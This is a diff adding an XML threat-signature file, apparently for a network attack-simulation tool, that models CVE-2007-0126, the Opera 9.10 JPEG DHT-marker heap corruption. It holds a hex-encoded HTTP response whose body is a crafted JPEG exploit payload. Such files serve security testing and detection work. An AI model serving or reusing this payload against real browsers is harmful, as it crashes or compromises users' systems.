@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Opera &lt;= 9.10 JPG Image DHT Marker Heap Corruption Vulnerability"/>
+    <EngDesc display="true" value="This threat uses a malicious jpeg file as its payload, sent to a vulnerable Opera web browser will result in execution of code and/or crashing. Opera is a web browser that typically connects to web servers listening on port 80."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Opera"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Opera_Opera"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Opera_Opera_9.10"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="www.milw0rm.com/exploits/3101"/>
+    <CVEID display="true" value="CVE-2007-0126"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="31574"/>
+    <Author display="true" value="MIke Davis"/>
+    <ID display="true" value="7c779c0fd7bc6a1f9649d861578a1f11"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633047047582187500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1169187260" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="G"/>
+    </for>
+    <for index="F">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E310D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="08">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C203137204A616E20323030372030353A30333A343320474D540D0A5365727665723A204170616368650D0A4C6173742D4D6F6469666965643A205765642C203137204A616E20323030372030353A30323A353520474D540D0A455461673A202262373733352D3133302D34323733353634333833646330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203330340D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20696D6167652F6A7065670D0A0D0AFFD8FFE000104A46494600010200006400640000FFEC00114475636B79000100040000000A0000FFEE000E41646F62650064C000000001FFDB0084001410101912192717172732261F26322E262626262E3E35353535353E44414141414141444444444444444444444444444444444444444444444444444444444401151919201C2026181826362620263644362B2B364444444235424444444444444444444444444444444444444444444444444444444444444444444444444444FFC00011080001000103012200021101031101FFC4004B00020100000000000000000000000000000000410000000000000000000000000000000000100100000000000000000000000000000000110100000000000000000000000000000000FFDA000C03010002110311003F00B3001FFFD9" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
